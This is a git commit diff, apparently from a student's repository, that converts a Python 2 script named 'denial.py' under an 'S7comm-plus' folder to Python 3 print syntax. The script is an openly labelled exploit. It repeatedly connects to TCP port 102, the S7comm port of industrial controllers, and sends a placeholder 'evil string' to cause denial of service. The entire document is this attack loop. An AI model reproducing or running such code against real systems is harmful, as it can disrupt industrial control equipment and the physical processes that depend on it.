29568205ee59be40c4771543913d5d452b36ac47
Miguel Oleo <miguel.oleo@alu.comillas.edu>
2022-02-23 20:11:42 +0100

    update

--- S7comm-plus/denial.py
+++ S7comm-plus/denial.py
@@ -2,16 +2,16 @@ import socket
 import sys
 from time import sleep 
 if len(sys.argv) != 2: 
-    print "Usage: exploit.py <ip>" 
+    print("Usage: exploit.py <ip>")
     sys.exit(0) 
 for x in range(1,50): 
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #vulnerable TCP port 102 
     connect=s.connect((str(sys.argv[1]), 102))
     s.send('some evil string \r\n\n') 
-    print "bufff " + str(x) + " sent...\n"
+    print("bufff " + str(x) + " sent...\n")
     result=s.recv(1024) 
-    print result 
+    print(result)
     s.close() 
     sleep(7)
             
